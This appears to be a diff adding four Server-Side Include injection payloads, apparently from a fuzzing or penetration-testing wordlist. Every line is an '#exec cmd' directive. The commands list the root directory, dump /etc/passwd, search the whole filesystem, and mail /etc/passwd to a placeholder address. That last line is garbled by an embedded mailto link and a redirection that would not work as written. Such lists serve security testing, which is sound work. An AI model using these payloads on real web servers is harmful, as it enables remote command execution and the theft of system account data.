@@ -1,0 +1,4 @@
+<!--#exec cmd="/bin/ls /" --><br/>
+<!--#exec cmd="cat /etc/passwd" --><br/>
+<!--#exec cmd="find / -name *.* -print" --><br/>
+<!--#exec cmd="mail email@dom.tld <mailto:email@dom.tld> < cat /etc/passwd" --><br/>
